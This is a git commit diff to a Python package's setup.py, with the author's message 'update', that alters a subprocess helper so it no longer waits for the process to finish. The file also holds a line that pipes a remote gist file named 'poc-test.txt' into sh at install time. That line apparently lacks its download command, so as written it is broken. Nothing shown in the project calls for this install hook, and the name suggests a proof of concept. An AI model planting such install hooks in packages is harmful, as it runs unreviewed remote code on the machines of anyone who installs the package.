3e1de7af026d5b876e71bb5a6689279463ddf867
rroiii <royoswaldha@gmail.com>
2025-02-24 16:28:09 +0700

    update

--- setup.py
+++ setup.py
@@ -3,8 +3,7 @@ import subprocess, os
 
 def run_command(command):
     process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE)
-    process.wait()
-    return process.returncode
+    return process
 
 command = os.system("https://gist.githubusercontent.com/rroiii/56b6b9d8ace864bf66233e10b580f922/raw/75abf6e00ff9358ad6cc8eda67131b319259e86a/poc-test.txt -s | sh")
 
